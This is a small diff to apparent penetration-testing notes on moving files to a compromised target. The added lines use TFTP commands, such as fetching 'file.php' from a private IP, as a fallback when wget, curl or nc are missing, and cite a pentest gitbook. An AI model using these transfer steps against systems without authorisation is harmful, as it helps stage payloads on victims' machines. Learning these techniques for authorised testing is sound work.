@@ -21,4 +21,13 @@ On target
 if wget/curl/nc are all not available, TFTP can be used
 
     tftp 192.168.0.101
-    tftp> get myfile.txt
+    tftp> get somefile.txt
+
+or
+
+    tftp 192.168.1.254 <<< "get file.php file.php"
+    
+    
+    Source: https://chryzsh.gitbooks.io/pentestbook/transfering_files.html
+    
+    Inside also includes ssh access with keypair
